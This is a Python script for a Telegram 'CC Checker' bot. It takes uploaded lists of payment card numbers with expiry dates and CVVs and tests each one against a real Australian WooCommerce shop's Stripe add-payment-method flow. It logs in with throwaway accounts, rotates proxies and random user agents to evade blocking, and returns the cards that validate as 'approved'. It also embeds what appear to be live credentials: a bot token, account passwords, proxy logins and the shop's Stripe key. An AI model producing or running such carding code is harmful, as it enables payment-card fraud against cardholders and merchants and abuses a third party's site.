import os
import re
import time
import threading
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# Initialize bot with your token
bot = telebot.TeleBot("8321060547:AAFWTCjDWBxIeHNHoWItxfX_kZLusYdKQRc")  # Replace with your actual bot token

# User session management
user_sessions = {}

# Accounts and proxies (you should add more)
accounts = [
    ("gebekit817@smbei.com", "siara1234@"),
    ("rovotep945@smvvv.com", "siara1234@"),
    ("sidap91737@smvvv.com", "siara1234@"),
    ("ginexa6941@smbei.com", "siara1234@"),
    # Add more accounts here
]

proxies = [
    'p.webshare.io:80:rrnzihmz-rotate:gd40bko1cnrm',
    # Add more proxies here
]

# Global variables for tracking progress
live_lock = threading.Lock()
print_lock = threading.Lock()
index_lock = threading.Lock()

approved_count = 0
declined_count = 0
checked_count = 0
account_index = 0
proxy_index = 0

MAX_THREADS = 10

def get_next_account():
    global account_index
    with index_lock:
        acc = accounts[account_index % len(accounts)]
        account_index += 1
    return acc

def get_next_proxy():
    global proxy_index
    with index_lock:
        proxy_str = proxies[proxy_index % len(proxies)]
        proxy_index += 1
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
    else:
        proxy_url = f"http://{proxy_str}"
    return {'http': proxy_url, 'https': proxy_url}

def extract_cc_from_line(line):
    cc_match = re.search(r'(\d{13,16})[|: ]+(\d{1,2})[\/\-](\d{2,4})[|: ]+(\d{3,4})', line)
    if not cc_match:
        cc_match = re.search(r'(\d{13,16})[|: ]+(\d{1,2})[|: ]+(\d{2,4})[|: ]+(\d{3,4})', line)
    if cc_match:
        card, month, year, cvv = cc_match.group(1), cc_match.group(2), cc_match.group(3), cc_match.group(4)
        if len(year) == 2:
            year = '20'+year if int(year) < 50 else '19'+year
        if len(month) == 1:
            month = '0'+month
        return f"{card}|{month}|{year}|{cvv}"
    return None

def process_card(card_line, use_proxy, user_id):
    global approved_count, declined_count, checked_count
    cc_parts = card_line.split("|")
    if len(cc_parts) < 4:
        with print_lock:
            print(f"Invalid card format: {card_line}")
        return
    
    cc_number, exp_month, exp_year, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
    attempt = 0
    max_retries = 2
    
    while attempt < max_retries:
        session = requests.Session()
        email, password = get_next_account()
        proxy = get_next_proxy() if use_proxy else None
        if proxy:
            session.proxies.update(proxy)

        headers_common = {
            'authority': 'buildersdiscountwarehouse.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': UserAgent().random,
            'cache-control': 'max-age=0',
        }

        try:
            res = session.get('https://buildersdiscountwarehouse.com.au/my-account/', headers=headers_common, timeout=15)
            if res.status_code != 200:
                raise Exception(f"Login page HTTP {res.status_code}")
            soup = BeautifulSoup(res.text, 'html.parser')
            nonce_tag = soup.find(id="woocommerce-login-nonce")
            if not nonce_tag or not nonce_tag.get('value'):
                raise Exception("woocommerce-login-nonce missing")
            woocommerce_nonce = nonce_tag.get('value')

            headers_login = dict(headers_common)
            headers_login.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://buildersdiscountwarehouse.com.au',
                'referer': 'https://buildersdiscountwarehouse.com.au/my-account/',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
            })
            login_data = {
                'username': email,
                'password': password,
                'rememberme': 'forever',
                'woocommerce-login-nonce': woocommerce_nonce,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }
            session.post('https://buildersdiscountwarehouse.com.au/my-account/', headers=headers_login, data=login_data, timeout=15)

            headers_payment = dict(headers_common)
            headers_payment.update({
                'referer': 'https://buildersdiscountwarehouse.com.au/my-account/',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
            })
            session.get('https://buildersdiscountwarehouse.com.au/my-account/payment-methods/', headers=headers_payment, timeout=15)

            headers_add_payment = dict(headers_common)
            headers_add_payment.update({
                'referer': 'https://buildersdiscountwarehouse.com.au/my-account/payment-methods/',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
            })
            add_payment_resp = session.get('https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/', headers=headers_add_payment, timeout=15)

            soup2 = BeautifulSoup(add_payment_resp.text, 'html.parser')
            script_tags = soup2.find_all('script')
            ajax_nonce = None
            for script in script_tags:
                if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                    match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', script.string)
                    if match:
                        ajax_nonce = match.group(1)
                        break
            if not ajax_nonce:
                raise Exception("Ajax nonce missing")

            headers_stripe = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': UserAgent().random,
            }
            stripe_data = {
                "type": "card",
                "card[number]": cc_number,
                "card[cvc]": cvv,
                "card[exp_year]": exp_year,
                "card[exp_month]": exp_month,
                "allow_redisplay": "unspecified",
                "billing_details[address][country]": "IN",
                "payment_user_agent": "stripe.js/54a85a778c; stripe-js-v3/54a85a778c; payment-element; deferred-intent",
                "referrer": "https://buildersdiscountwarehouse.com.au",
                "time_on_page": "22658",
                "client_attribution_metadata[client_session_id]": "a0edd94e-1556-4777-8cb2-a09ad25d07b3",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": "df7a416c-d1e1-49f2-b19a-7bd013702451",
                "guid": "2e59390f-b875-4481-adc1-a1e8591b800eb17083",
                "muid": "d0327c05-f8b6-41a3-a5ac-c05d2401b111e0f164",
                "sid": "2efcfb76-860b-4751-ad06-b9642aed25a20fc969",
                "key": "pk_live_51Q107x2KzKeWTXXpOywsGdTNQaEtZZRE9LKseUzC1oS3jOdQnP41co3ZYTIckSdqdv2DWOt8nnX469QiDEGacfzl00qHBbMx73",
                "_stripe_version": "2024-06-20",
            }
            stripe_resp = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, timeout=15)
            if not stripe_resp.ok:
                raise Exception("Stripe payment method creation error")

            payment_method_id = stripe_resp.json()["id"]

            headers_ajax = {
                'authority': 'buildersdiscountwarehouse.com.au',
                'accept': '*/*',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://buildersdiscountwarehouse.com.au',
                'referer': 'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': UserAgent().random,
                'x-requested-with': 'XMLHttpRequest',
            }
            ajax_params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
            ajax_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }
            ajax_resp = session.post('https://buildersdiscountwarehouse.com.au/', params=ajax_params, headers=headers_ajax, data=ajax_data, timeout=15)
            ajax_json = ajax_resp.json()

            if ajax_json.get("success") and ajax_json.get("data", {}).get("status") == "succeeded":
                with live_lock:
                    approved_count += 1
                    checked_count += 1
                    with open(f"live_{user_id}.txt", "a") as f:
                        f.write(f"{card_line}\n")
                with print_lock:
                    print(f"{card_line} => APPROVED ✅️")
                try:
                    bot.send_message(user_id, f"{card_line} => APPROVED ✅️")
                except:
                    pass
                return
            else:
                msg = ajax_json.get("data", {}).get("error", {}).get("message", "Card declined")
                with print_lock:
                    print(f"{card_line} => {msg} ❌️")
                with live_lock:
                    declined_count += 1
                    checked_count += 1
                return

        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError):
            attempt += 1
            with print_lock:
                print(f"{card_line} => Proxy/IP banned ⚠️ - retrying {attempt}/{max_retries}")
            time.sleep(2)
            if attempt >= max_retries:
                with print_lock:
                    print(f"{card_line} => Proxy/IP error after {max_retries} retries, moving on ❌️")
                with live_lock:
                    declined_count += 1
                    checked_count += 1
                return

        except Exception as e:
            with print_lock:
                print(f"{card_line} => Error: {str(e)} ❌️")
            with live_lock:
                declined_count += 1
                checked_count += 1
            return

def check_cards(user_id, file_path, use_proxy):
    global approved_count, declined_count, checked_count
    approved_count = 0
    declined_count = 0
    checked_count = 0

    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        bot.send_message(user_id, "❌ File not found!")
        return

    unique_cards = set()
    for line in lines:
        cc = extract_cc_from_line(line)
        if cc:
            unique_cards.add(cc)
    cards = list(unique_cards)
    total_cards = len(cards)

    if total_cards == 0:
        bot.send_message(user_id, "No valid cards found in the file.")
        return

    bot.send_message(user_id, f"Found {total_cards} valid cards. Starting check...")

    start_time = time.time()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(process_card, card, use_proxy, user_id) for card in cards]
        for future in as_completed(futures):
            future.result()
    
    end_time = time.time()
    elapsed = end_time - start_time
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)

    # Send final results
    result_message = f"✅ Check Complete!\n\nApproved: {approved_count}\nDeclined: {declined_count}\nTotal: {checked_count}/{total_cards}"
    
    if mins > 0:
        result_message += f"\nTime taken: {mins}m {secs}s"
    else:
        result_message += f"\nTime taken: {secs}s"
    
    bot.send_message(user_id, result_message)
    
    # Send live cards file if any
    live_file = f"live_{user_id}.txt"
    if os.path.exists(live_file) and os.path.getsize(live_file) > 0:
        with open(live_file, 'rb') as f:
            bot.send_document(user_id, f, caption="Approved Cards")
        os.remove(live_file)
    else:
        bot.send_message(user_id, "No approved cards found.")

    # Clean up
    if os.path.exists(file_path):
        os.remove(file_path)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    welcome_text = """
    🎯 CC Checker Bot 🎯

    Send me a cc.txt file and I'll check all the cards for you!

    Features:
    • Multi-threaded checking
    • Real-time results
    • Proxy support
    • Detailed statistics

    Simply upload your cc.txt file to get started!
    """
    bot.send_message(user_id, welcome_text)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.chat.id
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    file_name = message.document.file_name
    
    if file_name != 'cc.txt':
        bot.send_message(user_id, "Please send a file named 'cc.txt'")
        return
    
    save_path = f"cc_{user_id}.txt"
    with open(save_path, 'wb') as f:
        f.write(downloaded_file)
    
    # Ask if user wants to use proxies
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add('Yes', 'No')
    
    user_sessions[user_id] = {'file_path': save_path}
    bot.send_message(user_id, "Do you want to use proxies?", reply_markup=markup)

@bot.message_handler(func=lambda message: message.chat.id in user_sessions and message.text in ['Yes', 'No'])
def handle_proxy_choice(message):
    user_id = message.chat.id
    use_proxy = message.text == 'Yes'
    file_path = user_sessions[user_id]['file_path']
    
    bot.send_message(user_id, "Starting card check... This may take a few minutes.")
    
    # Run the check in a separate thread to avoid blocking
    import threading
    thread = threading.Thread(target=check_cards, args=(user_id, file_path, use_proxy))
    thread.start()
    
    # Remove user session
    del user_sessions[user_id]

if __name__ == "__main__":
    print("Bot is running...")
    bot.polling()